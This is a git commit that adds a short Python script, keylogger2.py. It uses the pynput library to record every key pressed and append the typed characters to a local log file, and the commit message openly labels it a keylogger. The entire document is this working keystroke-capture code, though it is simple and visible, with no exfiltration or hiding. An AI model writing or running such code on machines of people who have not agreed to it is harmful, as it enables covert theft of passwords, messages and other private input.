18d421d33ba29315b14a112d38bd899705e58b07
alestanalves <alestanalves@gmail.com>
2022-05-31 22:01:48 -0300

    keylogger 2 add

---
+++ keylogger2.py
@@ -0,0 +1,33 @@
+from itertools import count
+import pynput
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    print('{0} pressed'.format(key))
+
+    if count >= 10:
+        count = 0
+        write_to_file(keys)
+        keys = []
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+def write_to_file(key):
+    with open('log.txt', 'a') as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find('space') > 0:
+                f.write('\n')
+            elif k.find('Key') == -1:
+                f.write(k)
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
